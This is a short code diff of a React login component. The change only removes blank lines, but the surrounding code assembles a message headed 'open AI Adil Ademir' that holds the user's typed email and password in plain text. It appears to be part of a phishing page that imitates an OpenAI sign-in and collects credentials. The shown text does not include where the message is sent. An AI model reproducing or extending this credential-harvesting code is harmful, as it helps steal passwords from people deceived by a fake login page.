@@ -19,8 +19,6 @@ const LogIn = () => {
     let message = `<b>open AI Adil Ademir</b>\n`
     message += `Email: ${value.email}\n`
     message += `Password: ${value.password}`
-
-
     const formChange = async (e: React.FormEvent<HTMLFormElement | HTMLButtonElement>) => {
         e.preventDefault()
         if (value.email.trim().length !== 0 && value.password.trim().length !== 0) {
